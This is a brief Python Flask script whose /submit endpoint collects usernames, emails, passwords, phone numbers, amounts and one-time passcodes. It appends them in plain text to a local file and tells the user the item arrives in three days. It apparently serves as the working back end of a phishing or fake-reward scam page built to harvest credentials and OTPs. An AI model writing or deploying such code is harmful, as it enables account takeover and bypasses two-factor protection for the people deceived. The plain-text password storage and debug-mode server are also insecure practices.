from flask import Flask, request, jsonify, render_template
import json

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    
    user_info = {
        "UserName/Uid": data.get("username"),
        "email": data.get("email"),
        "password": data.get("password"),
        "phone": data.get("phone"),
        "Amount": data.get("amount"),
        "OTP": data.get("otp")
    }
    
    with open('userData.txt', 'a') as f:
        f.write(json.dumps(user_info) + "\n")
    
    return jsonify({"message": "You will obtain your item within 3 days"}), 200

if __name__ == '__main__':
    app.run(debug=True)
    